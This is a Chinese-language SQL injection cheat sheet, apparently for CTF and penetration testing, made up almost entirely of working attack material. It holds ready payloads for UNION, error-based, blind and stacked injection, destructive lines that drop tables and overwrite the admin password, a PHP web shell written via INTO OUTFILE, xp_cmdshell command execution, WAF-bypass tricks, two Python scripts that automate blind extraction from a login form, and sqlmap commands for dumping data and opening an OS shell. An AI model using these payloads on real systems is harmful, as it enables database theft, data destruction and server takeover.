# SQL 注入模块

## 适用场景
- 登录框、搜索功能、参数化查询
- 存在数据库交互的任何功能点
- CTF Web 题目的 SQL 注入挑战

## 检查清单

```yaml
基础检测:
  - [ ] 单引号/双引号测试
  - [ ] 数字型/字符型判断
  - [ ] 布尔条件测试 (AND 1=1 / AND 1=2)
  - [ ] 时间延迟测试 (SLEEP/BENCHMARK)
  - [ ] 报错注入测试

数据库识别:
  - [ ] MySQL (version(), @@version)
  - [ ] PostgreSQL (version())
  - [ ] MSSQL (@@version)
  - [ ] SQLite (sqlite_version())
  - [ ] Oracle (banner from v$version)

注入类型:
  - [ ] 联合查询注入 (UNION SELECT)
  - [ ] 报错注入 (extractvalue/updatexml)
  - [ ] 布尔盲注
  - [ ] 时间盲注
  - [ ] 堆叠注入
  - [ ] 二次注入
  - [ ] 宽字节注入

WAF 绕过:
  - [ ] 大小写混合
  - [ ] 双写绕过
  - [ ] 内联注释
  - [ ] 编码绕过
  - [ ] 空格替换

常用工具:
  - sqlmap (自动化注入)
  - Burp Suite (手工测试)
  - HackBar (浏览器插件)
```

## 分析流程

### Step 1: 注入点检测

```sql
-- 基础测试
'
"
\
1'
1"
1' AND '1'='1
1' AND '1'='2
1' OR '1'='1
1 AND 1=1
1 AND 1=2

-- 注释符测试
1'--
1'#
1'/*
1';--

-- 时间延迟测试
1' AND SLEEP(5)--
1' AND BENCHMARK(10000000,MD5('a'))--
1'; WAITFOR DELAY '0:0:5'--
```

### Step 2: 数据库类型识别

```sql
-- MySQL
' AND 1=CONVERT(int,@@version)--
' UNION SELECT @@version--
' AND extractvalue(1,concat(0x7e,version()))--

-- PostgreSQL
' UNION SELECT version()--
' AND 1=CAST(version() AS int)--

-- MSSQL
' UNION SELECT @@version--
' AND 1=CONVERT(int,@@version)--

-- SQLite
' UNION SELECT sqlite_version()--

-- Oracle
' UNION SELECT banner FROM v$version WHERE rownum=1--
```

### Step 3: 联合查询注入

```sql
-- 判断列数
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 10--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- 判断回显位
' UNION SELECT 1,2,3--
' UNION SELECT 'a','b','c'--
0' UNION SELECT 1,2,3--

-- 获取数据库名
' UNION SELECT 1,database(),3--
' UNION SELECT 1,schema_name,3 FROM information_schema.schemata--

-- 获取表名
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1--

-- 获取列名
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--

-- 获取数据
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--
```

### Step 4: 报错注入

```sql
-- MySQL extractvalue
' AND extractvalue(1,concat(0x7e,(SELECT database())))--
' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))--
' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)))--

-- MySQL updatexml
' AND updatexml(1,concat(0x7e,(SELECT database())),1)--
' AND updatexml(1,concat(0x7e,(SELECT user())),1)--

-- MySQL floor
' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- MySQL exp (5.5.5+)
' AND exp(~(SELECT * FROM (SELECT user())a))--

-- MySQL geometrycollection
' AND geometrycollection((SELECT * FROM (SELECT * FROM (SELECT user())a)b))--

-- MSSQL
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
```

### Step 5: 布尔盲注

```sql
-- 基础布尔盲注
' AND (SELECT SUBSTRING(database(),1,1))='a'--
' AND (SELECT ASCII(SUBSTRING(database(),1,1)))>96--
' AND (SELECT LENGTH(database()))=5--

-- 二分法加速
' AND (SELECT ASCII(SUBSTRING(database(),1,1)))>64--
' AND (SELECT ASCII(SUBSTRING(database(),1,1)))>96--
' AND (SELECT ASCII(SUBSTRING(database(),1,1)))>112--

-- 使用 IF
' AND IF((SELECT SUBSTRING(database(),1,1))='a',1,0)--
```

### Step 6: 时间盲注

```sql
-- MySQL SLEEP
' AND IF((SELECT SUBSTRING(database(),1,1))='a',SLEEP(5),0)--
' AND IF((SELECT ASCII(SUBSTRING(database(),1,1)))>96,SLEEP(5),0)--

-- MySQL BENCHMARK
' AND IF(1=1,BENCHMARK(10000000,MD5('a')),0)--

-- MSSQL WAITFOR
'; IF (SELECT SUBSTRING(db_name(),1,1))='a' WAITFOR DELAY '0:0:5'--

-- PostgreSQL pg_sleep
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

### Step 7: 堆叠注入

```sql
-- 多语句执行
'; DROP TABLE users;--
'; INSERT INTO users VALUES('hacker','password');--
'; UPDATE users SET password='hacked' WHERE username='admin';--

-- 读写文件 (MySQL)
'; SELECT load_file('/etc/passwd');--
'; SELECT '<?php eval($_POST[1]);?>' INTO OUTFILE '/var/www/html/shell.php';--

-- 执行系统命令 (MSSQL)
'; EXEC xp_cmdshell('whoami');--
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
```

## WAF 绕过技巧

### 1. 空格绕过

```sql
-- 使用注释
/**/
/*! */

-- 使用特殊字符
%09  (Tab)
%0a  (换行)
%0b  (垂直制表符)
%0c  (换页)
%0d  (回车)
%a0  (不间断空格)

-- 使用括号
UNION(SELECT(1),(2),(3))
SELECT(username)FROM(users)

-- 示例
1'/**/UNION/**/SELECT/**/1,2,3--
1'%0aUNION%0aSELECT%0a1,2,3--
```

### 2. 关键字绕过

```sql
-- 大小写混合
UnIoN SeLeCt
uNiOn sElEcT

-- 双写绕过
ununionion selselectect
seselectlect

-- 内联注释
/*!UNION*/ /*!SELECT*/
/*!50000UNION*/ /*!50000SELECT*/

-- 编码绕过
%55%4e%49%4f%4e  (UNION)
%53%45%4c%45%43%54  (SELECT)

-- 十六进制
0x756e696f6e  (union)
```

### 3. 等号绕过

```sql
-- LIKE
' OR username LIKE 'admin'--

-- REGEXP
' OR username REGEXP '^admin$'--

-- BETWEEN
' OR 1 BETWEEN 1 AND 1--

-- IN
' OR 1 IN (1)--
```

### 4. 逗号绕过

```sql
-- JOIN
' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--

-- OFFSET
' UNION SELECT * FROM users LIMIT 1 OFFSET 0--

-- SUBSTR
SUBSTR(database() FROM 1 FOR 1)
MID(database(),1,1)
```

### 5. 引号绕过

```sql
-- 十六进制
' UNION SELECT * FROM users WHERE username=0x61646d696e--

-- CHAR
' UNION SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)--
```

### 6. 函数绕过

```sql
-- 替代函数
SUBSTR => MID, LEFT, RIGHT
ASCII => ORD, HEX
SLEEP => BENCHMARK
GROUP_CONCAT => CONCAT_WS
```

## 常见套路与解法

### 套路 1: 万能密码

**特征**: 登录框，简单过滤

**Payload**:
```sql
admin'--
admin'#
' OR 1=1--
' OR '1'='1
admin' OR '1'='1'--
```

### 套路 2: 数字型注入

**特征**: id=1 类参数

**Payload**:
```sql
1 AND 1=1
1 AND 1=2
1 UNION SELECT 1,2,3
1 ORDER BY 10
```

### 套路 3: 宽字节注入

**特征**: GBK 编码，addslashes 过滤

**Payload**:
```
%df' -> 運'
%bf' -> 縗'
```

### 套路 4: 二次注入

**特征**: 注册后在其他页面触发

**解法**:
```
1. 注册用户名: admin'--
2. 修改密码时触发
```

### 套路 5: HTTP 头注入

**特征**: X-Forwarded-For/User-Agent 存入数据库

**Payload**:
```http
X-Forwarded-For: 1' AND extractvalue(1,concat(0x7e,database()))--
User-Agent: 1' AND SLEEP(5)--
```

## 盲注自动化脚本

```python
#!/usr/bin/env python3
"""
布尔盲注自动化脚本
"""

import requests
import string

# 配置
url = "http://target.com/login.php"
param = "username"
true_flag = "Welcome"  # 成功标志

charset = string.ascii_lowercase + string.digits + "_"

def check(payload):
    """发送请求检查结果"""
    data = {param: payload, "password": "test"}
    resp = requests.post(url, data=data)
    return true_flag in resp.text

def get_length(query):
    """获取查询结果长度"""
    for i in range(1, 100):
        payload = f"' OR LENGTH(({query}))={i}-- "
        if check(payload):
            return i
    return 0

def get_data(query, length):
    """逐字符获取数据"""
    result = ""
    for i in range(1, length + 1):
        for c in charset:
            payload = f"' OR SUBSTRING(({query}),{i},1)='{c}'-- "
            if check(payload):
                result += c
                print(f"\r[+] {result}", end="")
                break
    print()
    return result

# 获取数据库名
print("[*] Getting database name...")
db_len = get_length("SELECT database()")
db_name = get_data("SELECT database()", db_len)
print(f"[+] Database: {db_name}")

# 获取表名
print("[*] Getting table names...")
tables = get_data(
    f"SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='{db_name}'",
    100
)
print(f"[+] Tables: {tables}")
```

```python
#!/usr/bin/env python3
"""
时间盲注自动化脚本
"""

import requests
import time
import string

url = "http://target.com/login.php"
param = "username"
delay = 2  # 延迟秒数

charset = string.ascii_lowercase + string.digits + "_"

def check(payload):
    """发送请求检查时间延迟"""
    data = {param: payload, "password": "test"}
    start = time.time()
    requests.post(url, data=data, timeout=delay + 5)
    elapsed = time.time() - start
    return elapsed >= delay

def get_length(query):
    """获取查询结果长度"""
    for i in range(1, 100):
        payload = f"' OR IF(LENGTH(({query}))={i},SLEEP({delay}),0)-- "
        if check(payload):
            return i
    return 0

def get_data(query, length):
    """二分法获取数据"""
    result = ""
    for i in range(1, length + 1):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            payload = f"' OR IF(ASCII(SUBSTRING(({query}),{i},1))>{mid},SLEEP({delay}),0)-- "
            if check(payload):
                low = mid + 1
            else:
                high = mid
        result += chr(low)
        print(f"\r[+] {result}", end="")
    print()
    return result

# 使用示例
print("[*] Getting database...")
db_len = get_length("SELECT database()")
db_name = get_data("SELECT database()", db_len)
print(f"[+] Database: {db_name}")
```

## SQLMap 使用速查

```bash
# 基础检测
sqlmap -u "http://target.com/page.php?id=1"

# POST 请求
sqlmap -u "http://target.com/login.php" --data="username=test&password=test"

# Cookie 注入
sqlmap -u "http://target.com/" --cookie="id=1"

# 指定注入点
sqlmap -u "http://target.com/login.php" --data="username=test*&password=test"

# 获取所有数据库
sqlmap -u "http://target.com/page.php?id=1" --dbs

# 获取表
sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables

# 获取列
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T tablename --columns

# 获取数据
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T tablename --dump

# 绕过 WAF
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment
sqlmap -u "http://target.com/page.php?id=1" --random-agent

# OS Shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# 常用 tamper
space2comment, randomcase, charencode, between, equaltolike
```

## 工具速查

```bash
# 自动化注入
sqlmap -u "http://target.com/page.php?id=1" --dbs

# 手工测试
# 使用 Burp Suite Repeater

# 在线工具
# http://sqlmap.org/
```
